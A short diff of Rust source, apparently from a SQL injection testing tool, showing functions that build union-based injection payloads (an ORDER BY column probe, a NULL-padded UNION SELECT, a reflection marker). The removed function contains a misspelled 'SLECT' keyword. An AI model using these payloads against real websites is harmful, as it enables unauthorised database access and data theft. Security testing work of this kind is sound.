@@ -39,11 +39,6 @@ pub fn union_order_by(n: u32) -> String {
     format!("1' ORDER BY {}-- -", n)
 }
 
-pub fn union_find_column(n: u32) -> String {
-    let nulls: Vec<&str> = vec!["NULL"; n as usize];
-    format!("1' UNION SLECT {}-- -", nulls.join(","))
-}
-
 pub fn union_find_reflection(n: u32, pos: u32) -> String {
     let mut cols: Vec<String> = vec!["NULL".to_string(); n as usize];
     cols[pos as usize] = "'sqli_test'".to_string();
